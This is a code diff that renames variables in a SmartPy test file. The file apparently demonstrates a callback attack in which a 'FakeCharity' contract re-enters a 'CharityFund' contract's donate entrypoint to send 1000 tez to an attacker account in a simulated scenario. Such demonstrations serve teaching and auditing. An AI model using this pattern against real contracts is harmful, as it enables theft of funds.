@@ -4,7 +4,6 @@ import smartpy as sp
 def main():
 
     class CharityFund(sp.Contract):
-    
         def __init__(self, admin):
             self.data.admin = admin
             
@@ -19,14 +18,14 @@ def main():
             pass
            
     class FakeCharity(sp.Contract):
-        def __init__(self, attackedContract, attacker):
-            self.data.attackedContract = attackedContract
+        def __init__(self, attacked_contract, attacker):
+            self.data.attacked_contract = attacked_contract
             self.data.attacker = attacker
 
         @sp.entrypoint
         def default(self):
             charity_contract = sp.contract(sp.record(donation = sp.mutez, charity = sp.address),
-                                           self.data.attackedContract,
+                                           self.data.attacked_contract,
                                            entrypoint="donate").unwrap_some()
             sp.transfer(sp.record(donation = sp.tez(1000), charity = self.data.attacker),
                         sp.tez(0),
@@ -36,13 +35,13 @@ def main():
 def test():
     admin = sp.test_account("admin").address
     attacker = sp.test_account("attacker").address
-    charityFund = main.CharityFund(admin)
+    charity_fund = main.CharityFund(admin)
     scenario = sp.test_scenario(main)
-    scenario += charityFund
-    charityFund.deposit().run(amount = sp.tez(10000), sender = admin)
+    scenario += charity_fund
+    charity_fund.deposit().run(amount = sp.tez(10000), sender = admin)
 
-    fakeCharity = main.FakeCharity(attackedContract = charityFund.address, attacker = attacker)
-    scenario += fakeCharity
-    charityFund.donate(donation = sp.tez(1), charity = fakeCharity.address).run(sender = admin)
+    fake_charity = main.FakeCharity(attacked_contract = charity_fund.address, attacker = attacker)
+    scenario += fake_charity
+    charity_fund.donate(donation = sp.tez(1), charity = fake_charity.address).run(sender = admin)
 
-    charityFund.deposit().run(amount = sp.tez(0), sender = admin)
+    charity_fund.deposit().run(amount = sp.tez(0), sender = admin)
